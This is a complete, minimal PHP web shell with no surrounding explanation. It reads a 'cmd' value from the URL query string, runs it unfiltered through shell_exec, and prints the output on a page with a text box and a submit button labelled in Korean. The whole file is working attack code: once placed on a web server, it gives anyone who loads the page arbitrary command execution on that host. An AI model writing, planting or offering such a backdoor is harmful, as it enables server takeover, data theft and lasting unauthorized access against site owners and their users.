<?php
if(isset($_GET['cmd'])){
    $result = shell_exec($_GET['cmd']);
}
?>
<!DOCTYPE html>
<html>
<body>
<form method="GET">
    <input type="text" name="cmd" style="width:300px">
    <input type="submit" value="실행">
</form>
<pre><?php echo isset($result) ? $result : ''; ?></pre>
</body>
</html>
